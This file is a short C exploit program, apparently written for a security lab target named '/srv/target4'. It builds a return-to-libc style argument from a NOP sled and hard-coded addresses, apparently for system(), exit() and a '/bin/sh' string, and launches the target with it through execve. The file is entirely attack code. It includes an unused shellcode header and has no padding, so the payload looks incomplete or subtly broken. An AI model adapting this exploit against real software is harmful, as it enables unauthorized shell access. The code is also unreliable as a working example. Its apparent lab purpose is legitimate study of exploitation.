#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

const char* TARGET = "/srv/target4";

const char SLED[] = "\x90\x90\x90\x90\x90\x90\x90\x90";
const char SYS[] = "\x60\x43\xe1\xf7";
const char EX[] = "\xc0\x6e\xe0\xf7";
const char SH[] = "\x63\xf3\xf5\xf7";

int main(void)
{
    char args[2][300]; // Adjust size as needed to match your payload requirement
    char *env[1];
    strcpy(args[0], TARGET);

    // Create a single buffer that includes the sled and the addresses
    snprintf(args[1], sizeof(args[1]), "%s%s%s%s", SLED, SYS, EX, SH);

    char *exec_args[] = {args[0], args[1], NULL};
    env[0] = NULL;

    execve(TARGET, exec_args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
